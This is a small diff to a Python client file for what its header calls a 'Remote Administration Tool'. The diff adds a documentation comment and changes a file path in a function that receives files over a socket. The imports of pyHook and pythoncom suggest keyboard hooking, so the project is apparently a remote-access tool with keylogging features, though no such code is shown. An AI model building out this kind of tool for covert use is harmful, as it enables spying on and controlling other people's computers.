@@ -1,5 +1,12 @@
 #! /usr/bin/env python
-
+##
+#\file client.py
+#
+#\brief The client for our Remote Administration Tool
+#
+#\author Elephant Bomb
+#
+#\date 2016-04-10
 import pythoncom
 import pyHook
 import socket
@@ -18,7 +25,7 @@ def incomingFile(data, socketHolder):
         if nextData == "FILEDONE": 
             break
         else:
-            with open("C:\input.txt", 'w') as file:
+            with open("client_data.txt", 'w') as file:
                 file.write(nextData)
             nextData = socketHolder.recv(1024)
 
